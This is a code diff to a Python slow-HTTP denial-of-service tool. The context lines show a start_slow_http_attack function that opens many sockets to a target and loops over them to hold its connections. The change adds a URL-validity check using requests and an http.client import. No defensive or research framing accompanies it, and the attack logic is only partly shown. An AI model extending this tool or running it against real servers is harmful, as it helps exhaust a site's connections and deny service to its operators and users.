@@ -5,10 +5,25 @@ import time
 import sys
 from threading import Thread
 from colorama import init, Fore, Back, Style
-
+import http.client
 
 #Global variables
 ongoing = True
+
+
+def check_if_url_is_valid(url):
+    import requests
+    try:
+        request = requests.get(url)
+        if request.status_code == 200:
+            return True
+        # c = http.client.HTTPConnection(url)
+        # c.request("HEAD", '')
+        # if c.getresponse().status == 200:
+        #     return True
+    except Exception as e:
+        pass
+    return False
 
 
 def init_request(url: str, port: int) -> socket:
@@ -31,7 +46,6 @@ def start_slow_http_attack(url: str,
     global ongoing
     sockets = [init_request(url, port) for _ in range(workers_count) if ongoing]
     ongoing = True
-
     while ongoing:
         for i, s in enumerate(sockets):
             try:
